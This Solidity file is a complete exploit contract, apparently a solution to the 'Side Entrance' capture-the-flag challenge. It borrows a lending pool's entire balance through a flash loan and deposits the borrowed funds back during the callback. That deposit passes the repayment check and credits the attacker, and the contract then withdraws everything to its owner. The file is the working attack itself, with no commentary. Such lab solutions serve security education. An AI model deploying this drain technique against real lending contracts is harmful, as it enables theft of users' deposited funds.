// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceExploit {

    SideEntranceLenderPool public lendPool;
    address public immutable owner;

    constructor(address _lendPool)
    {
        lendPool = SideEntranceLenderPool(_lendPool);
        owner = msg.sender;
    }

    receive() external payable { }

    function doFlashLoanThenDepositImmediately() external
    {
        lendPool.flashLoan(address(lendPool).balance);
    }

    function execute() external payable
    {
        lendPool.deposit{value: address(this).balance}();
    }

    function withdraw() external payable
    {
        lendPool.withdraw();
        payable(owner).transfer(address(this).balance);
    }

}
